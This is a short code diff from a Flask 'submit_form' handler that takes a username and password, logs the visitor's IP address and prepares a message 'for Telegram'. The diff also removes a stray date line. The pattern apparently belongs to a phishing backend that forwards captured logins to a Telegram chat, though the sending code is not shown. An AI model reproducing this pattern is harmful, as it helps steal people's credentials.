@@ -31,7 +31,6 @@ def submit_form():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
     if not username or not password:
- Juno 2025, 10:59 PM WAT:
         return jsonify({"error": "Missing username or password"}), 400
 
     # Format message for Telegram
